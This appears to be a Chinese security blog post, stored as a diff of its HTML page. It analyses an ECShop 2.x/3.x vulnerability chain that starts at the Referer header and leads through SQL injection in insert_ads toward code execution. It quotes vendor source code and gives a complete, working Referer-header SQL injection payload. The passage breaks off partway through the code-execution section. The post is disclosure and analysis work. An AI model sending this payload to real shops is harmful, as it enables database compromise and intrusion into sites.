@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="背景   ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式E">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ECShop 0day的堕落之路">
+<meta property="og:url" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/index.html">
+<meta property="og:site_name" content="Badcode">
+<meta property="og:description" content="背景   ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop 2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/ecshop_hash.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/sqli.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/reg.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/27mysql.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/27phpinfo.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/30phpinfo_ma.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/payload.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/example.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/count3.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/zoomeye.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/patch.png">
+<meta property="og:updated_time" content="2018-09-05T10:21:17.010Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ECShop 0day的堕落之路">
+<meta name="twitter:description" content="背景   ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop 2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇">
+<meta name="twitter:image" content="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/ecshop_hash.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/"/>
+
+
+
+
+
+  <title>ECShop 0day的堕落之路 | Badcode</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Badcode</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2018/09/04/ECShop-0day的堕落之路/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Badcode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Badcode">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ECShop 0day的堕落之路</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T18:18:56+08:00">
+                2018-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>   ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop 2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇Seebug漏洞平台并<a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">收录</a>。</p>
+<p>随后于2018年8月31日，ID为“ringk3y”研究人员在其博客公开这个<a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">漏洞</a>，并做了详细分析，该分析收录在<a href="https://paper.seebug.org/691/" target="_blank" rel="noopener">Seebug Paper</a>。</p>
+<p>知道创宇404积极防御团队于2018年9月2日正式对外发布<a href="https://www.yunaq.com/news/5b8ca434796db41371c1cf45/" target="_blank" rel="noopener">《ECShop全系列版本的远程代码执行漏洞》</a>预警。</p>
+<p>从2018年的6月13日首次拦截后，知道创宇404实验室多个团队对这个利用ECShop 0day攻击事件进行持续的监控分析，从下文的分析结果可以看出一个0day漏洞在实际攻击中的各个阶段的“堕落”过程。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞影响ECShop 2.x和3.x版本，是一个典型的“二次漏洞”，通过<code>user.php</code>文件中<code>display()</code>函数的模板变量可控，从而造成SQL注入漏洞，而后又通过SQL注入漏洞将恶意代码注入到危险函数<code>eval</code>中，从而实现了任意代码执行。</p>
+<p>值得一提的是攻击者利用的payload只适用于ECShop 2.x版本导致有部分安全分析者认为该漏洞不影响ECShop 3.x，这个是因为在3.x的版本里有引入防注入攻击的安全代码，通过我们分析发现该防御代码完全可以绕过实现对ECShop 3.x的攻击（详见下文分析）。</p>
+<p>注：以下代码分析基于ECShop 2.7.3</p>
+<h4 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h4><p>首先看到<code>ecshop/user.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>$back_act</code>是从<code>HTTP_REFERER</code>获取到的，<code>HTTP_REFERER</code>是外部可控的，这也是万恶的根源。</p>
+<p>接着将<code>back_act</code>变量传递给<code>assign</code>函数，跟进<code>ecshop/includes/cls_template.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 注册变量</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span>   mix      $tpl_var</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span>   mix      $value</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span>  void</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>可以从注释了解这个函数的功能，是注册模板变量，也就是<code>$back_act</code>变成了<code>$this-&gt;_var[$back_act]=$back_act</code>，而后调用<code>display</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">    error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">    $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">        <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">    &#125;</span><br><span class="line">    error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从<code>user.php</code>调用<code>display</code>函数，传递进来的<code>$filename</code>是<code>user_passport.dwt</code>，从函数来看，首先会调用<code>$this-&gt;fetch</code>来处理<code>user_passport.dwt</code>模板文件，<code>fetch</code>函数中会调用<code>$this-&gt;make_compiled</code>来编译模板。<code>user_passport.dwt</code>其中一段如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"act_login"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"back_act"</span> <span class="attr">value</span>=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"us_Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>make_compiled</code>会将模板中的变量解析，也就是在这个时候将上面<code>assign</code>中注册到的变量<code>$back_act</code>传递进去了，解析完变量之后返回到<code>display</code>函数中。此时<code>$out</code>是解析变量后的html内容，判断<code>$this-&gt;_echash</code>是否在<code>$out</code>中，若在，使用<code>$this-&gt;_echash</code>来分割内容，得到<code>$k</code>然后交给<code>insert_mod</code>处理。</p>
+<p><img src="ecshop_hash.png" alt=""></p>
+<p>由于<code>_echash</code>是默认的，不是随机生成的，所以<code>$val</code>内容可随意控制。跟进<code>$this-&gt;insert_mod</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fun($para);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$val</code>传递进来，先用<code>|</code>分割，得到<code>$fun</code>和<code>$para</code>，<code>$para</code>进行反序列操作，<code>$fun</code>和<code>insert_</code>拼接，最后动态调用<code>$fun($para)</code>，函数名部分可控，参数完全可控。接下来就是寻找以<code>insert_</code>开头的可利用的函数了，在<code>ecshop/includes/lib_insert.php</code>有一个<code>insert_ads</code>函数，正好满足要求。看下<code>insert_ads</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用指定的广告位的广告</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   integer $id     广告位ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   integer $num    广告数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    $ads = <span class="keyword">array</span>();</span><br><span class="line">    $position_style = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br><span class="line">        <span class="keyword">switch</span> ($row[<span class="string">'media_type'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    $position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$arr</code>是可控的，并且会拼接到SQL语句中，这就造成了SQL注入漏洞。</p>
+<p>根据上面的流程，可以构造出如下形式的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echash+fun|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</span><br></pre></td></tr></table></figure>
+<p>实际可利用payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="sqli.png" alt=""></p>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>继续看<code>insert_ads</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$position_style = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br><span class="line">        <span class="keyword">switch</span> ($row[<span class="string">'media_type'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">......</span><br><span class="line">    $position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $val;</span><br></pre></td></tr></table></figure>
+<p>可以看到在SQL查询结束之后会调用模板类的<code>fetch</code>方法，在<code>user.php</code>中调用<code>display</code>，然后调用<code>fetch</code>的时候传入的参数是<code>user_passport.dwt</code>，而在此处传入的参数是<code>$position_style</code>，向上溯源，发现是<code>$row[&#39;position_style&#39;]</code>赋值而来，也就是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是<code>$position_style</code>可控。</p>
